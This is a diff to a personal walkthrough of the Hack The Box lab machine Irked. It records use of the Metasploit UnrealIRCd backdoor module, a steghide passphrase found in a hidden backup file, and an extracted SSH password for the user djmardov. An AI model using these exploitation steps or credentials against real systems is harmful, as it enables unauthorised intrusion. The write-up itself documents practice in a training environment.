@@ -31,6 +31,28 @@ Matching Modules
    0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
 
 Setting RHOSTS and RPORT gets us a shell!
+RHOSTS:10.10.10.117
+RPORT:6697
+
+There is a user djmardov, but user.txt in Documents says Permission denied
+There is a hidden .backup file
+
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+
+This password corresponds to the irked.jpg at 10.10.10.117
+ryann@kali:~/HackTheBox/Irked_117$ steghide extract -sf irked.jpg
+Enter passphrase:
+wrote extracted data to "pass.txt".
+ryan@kali:~/HackTheBox/Irked_117$ cat pass.txt
+Kab6h+m+bbp2J:HG
+
+We can now ssh into the server as djmardov with the supplied password
+We can cat /home/djmardov/Documents/user.txt
+
+djmardov@irked:~/Documents$ wc user.txt
+ 1  1 33 user.txt
+
 ###########
 # Learned #
 ###########
